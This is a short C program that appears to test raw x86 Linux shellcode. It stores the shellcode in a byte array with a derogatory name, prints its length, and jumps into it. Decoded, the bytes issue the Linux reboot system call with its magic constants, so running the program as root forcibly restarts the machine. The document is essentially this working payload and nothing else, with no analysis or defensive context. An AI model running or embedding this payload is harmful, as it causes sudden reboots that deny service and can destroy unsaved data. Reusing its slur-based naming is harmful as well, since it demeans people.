#include <stdio.h>


unsigned char gaycode[] = 
    "\x31\xc0\xbb\xad\xde\xe1\xfe\xb9\x69\x19\x12\x28\xba\x67\x45\x23\x01\xb0"
    "\x58\xcd\x80";

int main()
{
   void (*f)();

   f = (void *) gaycode;

   printf("%d\n", strlen(gaycode));

   f();

    return 1337;
}
